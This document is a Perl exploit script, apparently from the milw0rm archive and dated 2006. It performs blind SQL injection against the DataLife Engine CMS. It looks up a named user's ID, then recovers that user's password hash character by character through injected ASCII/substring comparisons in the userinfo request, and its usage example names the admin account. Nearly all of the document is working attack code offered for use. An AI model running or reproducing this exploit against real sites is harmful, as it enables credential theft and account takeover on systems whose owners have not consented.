#!/usr/bin/perl

## DataLife Engine sql injection exploit by RST/GHC
## (c)oded by 1dt.w0lf
## RST/GHC
## http://rst.void.ru
## http://ghc.ru
## 18.06.06

use LWP::UserAgent;
use Getopt::Std;

getopts('u:n:p:');

$url  = $opt_u;
$name = $opt_n;
$prefix = $opt_p || 'dle_';

if(!$url || !$name) { &usage; }

$s_num = 1;
$|++;
$n = 0;
&head;
print "\r\n";
print " [~]      URL : $url\r\n";
print " [~] USERNAME : $name\r\n";
print " [~]   PREFIX : $prefix\r\n";
$userid = 0;
print " [~] GET USERID FOR USER \"$name\" ...";
$xpl = LWP::UserAgent->new() or die;
$res = $xpl->get($url.'?subaction=userinfo&user='.$name);
if($res->as_string =~ /do=lastcomments&userid=(\d*)/) { $userid = $1; }
elsif($res->as_string =~ /do=pm&doaction=newpm&user=(\d*)/) { $userid = $1; }
elsif($res->as_string =~ /do=feedback&user=(\d*)/) { $userid = $1; }
if($userid != 0 ) { print " [ DONE ]\r\n"; }
else { print " [ FAILED ]\r\n"; exit(); }
print " [~]   USERID : $userid\r\n";

print " [~] SEARCHING PASSWORD ...  ";

while(1)
{
if(&found(47,58)==0) { &found(96,103); } 
$char = $i;
if ($char=="0") 
 { 
 if(length($allchar) > 0){
 print qq{\b  [ DONE ] 
 ---------------------------------------------------------------
  USERNAME : $name
    USERID : $userid
  PASSHASH : $allchar
 ---------------------------------------------------------------
 };
 }
 else
 {
 print "\b[ FAILED ]";
 }
 exit();  
 }
else 
 {  
 $allchar .= chr($char);
 print "\b".chr($char)." ";
 }
$s_num++;
}

sub found($$)
 {
 my $fmin = $_[0];
 my $fmax = $_[1];
 if (($fmax-$fmin)<5) { $i=crack($fmin,$fmax); return $i; }
 
 $r = int($fmax - ($fmax-$fmin)/2);
 $check = "/**/BETWEEN/**/$r/**/AND/**/$fmax";
 if ( &check($check) ) { &found($r,$fmax); }
 else { &found($fmin,$r); }
 }
 
sub crack($$)
 {
 my $cmin = $_[0];
 my $cmax = $_[1];
 $i = $cmin;
 while ($i<$cmax)
  {
  $crcheck = "=$i";
  if ( &check($crcheck) ) { return $i; }
  $i++;
  }
 $i = 0;
 return $i;
 }
 
sub check($)
 {
 $n++;
 status();
 $ccheck = $_[0]; 
 $xpl = LWP::UserAgent->new() or die;
 $res = $xpl->get($url.'?subaction=userinfo&user='.$name.'%2527 and ascii(substring((SELECT password FROM '.$prefix.'users WHERE user_id='.$userid.'),'.$s_num.',1))'.$ccheck.'/*');
 if($res->as_string =~ /$name<\/td>/) { return 1; }
 else { return 0; }
 }
 
sub status()
{
  $status = $n % 5;
  if($status==0){ print "\b/";  }
  if($status==1){ print "\b-";  }
  if($status==2){ print "\b\\"; }
  if($status==3){ print "\b|";  }
}

sub usage()
 {
 &head;
 print q(
  USAGE:
  r57datalife.pl [OPTIONS]
  
  OPTIONS:
  -u <URL>      - path to index.php
  -n <USERNAME> - username for bruteforce
  -p [prefix]   - database prefix
  
  E.G.
  r57datalife.pl -u http://server/index.php -n admin
 ---------------------------------------------------------------
 (c)oded by 1dt.w0lf
 RST/GHC , http://rst.void.ru , http://ghc.ru
 );
 exit();
 }
sub head()
 {
 print q(
 ---------------------------------------------------------------
       DataLife Engine sql injection exploit by RST/GHC
 ---------------------------------------------------------------
 );
 }

# milw0rm.com [2006-06-21]
